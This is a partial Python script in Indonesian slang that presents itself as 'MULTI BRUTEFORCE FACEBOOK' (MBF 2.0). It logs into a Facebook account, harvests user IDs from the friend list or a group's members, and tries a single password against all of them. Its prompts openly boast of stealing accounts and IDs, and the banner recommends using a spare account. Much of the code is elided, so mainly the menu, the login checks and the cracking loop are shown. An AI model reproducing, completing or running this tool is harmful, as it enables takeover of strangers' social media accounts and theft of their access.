...
def tampilhasil(akun,sandi,data):
	...
	i = inputD('[?] Masih belom puas ,Mau coba lagi (y/t)',['Y','T'])
	if i.upper() == 'Y':
		return crack(data)
	else:
		return menu()
def crack0(data,sandi):
	akun = []
	cetak('!h[*] Mencuri !k%d Akun !hdengan sandi !m[!k%s!m]'%(len(data),sandi))
	...
	while 1:
		...
		if v:
			if a.upper() in v:
				...
				cetak('!m[!] Tulis y/n dulu gan...')
				continue
		else:
			if len(a) == 0:
				cetak('!m[!] Ahh yang bener masukinnya')
				continue
			else:
				break
	return a
...
def login():
	...
	if 'save-device' in url or 'm_sess' in url:
		...
		cetak('!h[*] Selamat datang !msayang !k%s'%nama)
		cetak('!h[*] Semoga ini adalah hari keberuntungan mu...')
		log = 1
	elif 'checkpoint' in url:
		cetak('!m[!] Akun Lo Rusak Bego\n!k[!]Coba Login Make Si Montok')
		keluar()
	else:
		cetak('!m[!] Login Gagal')
def idgroup():
	if log != 1:
		cetak('!h[*] Login !bFB!h dulu !cya !sayang...')
		login()
		if log == 0:
			keluar()
	...
	while 1:
		...
		try:
			...
			cetak('!m[!] Sorry cuma ini yang bisa saya ambil  !h %d id'%len(id_bgroup))
			break
	simpan()
...
def idteman():
	if log != 1:
		cetak('!h[*] Login !bFB !hdulu !cya !ksayang...')
		login()
		if log == 0:
			keluar()
	cetak('!h[*] Tunggu lagi ngumpulin id...')
	...
	cetak('!h[*] Nyolong !p%s !hid teman'%jumlah) 
	...
	if i.upper() == 'Y':
		...
		return menu()
def menu():
	cetak("\n           !h.-.-..\n          /+/++//\n         /+/++//\n  !k*   !k* !h/+/++//\n   \ /  |/__//\n !h{!mX!h}v{!mX!h}!0!b|!cMBF!b|==========.\n   !h(!m'!h)!0  !h/'|'\           !b\\\n       !h/  \  \          !b'\n       !h\_  \_ \_   !k___!mMBF !c2.0!k___\n\n !m* !bMULTI BRUTEFORCE FACEBOOK\n !m* !cNURIL ANWAR\n !m* !pKalau Kalian Takut Akun Pribadi  Kalian Rusak\n !m* !pKalian Gunakan Saja Akun cadangan \n !m* !pTidak Berguna Lagi..selamat mecoba..\n!k.======================.\n|!h  NYOLONG !mID!h DARI.... !k|\n'======================'\n!k#!p1 !hDAFTAR TEMAN\n!k#!p2 !hANGGOTA GROUP\n!k#!p3 !mKELUAR...")
